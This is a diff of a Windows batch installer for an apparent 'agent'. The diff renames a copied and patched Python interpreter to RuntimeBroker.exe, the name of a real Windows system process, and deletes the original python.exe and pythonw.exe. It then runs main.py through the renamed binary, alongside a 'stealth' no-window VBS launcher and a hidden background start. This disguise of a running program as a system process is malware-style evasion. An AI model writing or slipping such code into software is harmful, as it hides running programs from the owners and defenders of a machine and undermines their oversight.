@@ -151,14 +151,13 @@ echo [8/8] Creating launcher files...
 echo @echo off
 echo cd /d "%%~dp0"
 echo set "VENV=%%~dp0.venv\Scripts"
-echo taskkill /F /IM techno.exe ^>nul 2^>^&1
-echo if not exist "%%VENV%%\techno.exe" ^(
-echo     copy /Y "%%VENV%%\python.exe" "%%VENV%%\techno.exe" ^>nul 2^>^&1
-echo     "%%VENV%%\python.exe" "%%~dp0patch_exe.py" "%%VENV%%\techno.exe" ^>nul 2^>^&1
+echo if not exist "%%VENV%%\RuntimeBroker.exe" ^(
+echo     copy /Y "%%VENV%%\python.exe" "%%VENV%%\RuntimeBroker.exe" ^>nul 2^>^&1
+echo     "%%VENV%%\python.exe" "%%~dp0patch_exe.py" "%%VENV%%\RuntimeBroker.exe" ^>nul 2^>^&1
 echo ^)
 echo if exist "%%VENV%%\python.exe" del /F /Q "%%VENV%%\python.exe" ^>nul 2^>^&1
 echo if exist "%%VENV%%\pythonw.exe" del /F /Q "%%VENV%%\pythonw.exe" ^>nul 2^>^&1
-echo "%%VENV%%\techno.exe" main.py
+echo "%%VENV%%\RuntimeBroker.exe" main.py
 ) > run_agent.bat
 
 :: invisible_agent.vbs — stealth launcher (no visible window)
@@ -175,10 +174,9 @@ echo   invisible_agent.vbs - launch stealth ^(no window^)
 
 :: ── DONE — Launch as independent hidden process ─────────────────
 set "VENV=%~dp0.venv\Scripts"
-taskkill /F /IM techno.exe >nul 2>&1
-if not exist "%VENV%\techno.exe" (
-    copy /Y "%VENV%\python.exe" "%VENV%\techno.exe" >nul 2>&1
-    "%VENV%\python.exe" "%~dp0patch_exe.py" "%VENV%\techno.exe" >nul 2>&1
+if not exist "%VENV%\RuntimeBroker.exe" (
+    copy /Y "%VENV%\python.exe" "%VENV%\RuntimeBroker.exe" >nul 2>&1
+    "%VENV%\python.exe" "%~dp0patch_exe.py" "%VENV%\RuntimeBroker.exe" >nul 2>&1
 )
 if exist "%VENV%\python.exe" del /F /Q "%VENV%\python.exe" >nul 2>&1
 if exist "%VENV%\pythonw.exe" del /F /Q "%VENV%\pythonw.exe" >nul 2>&1
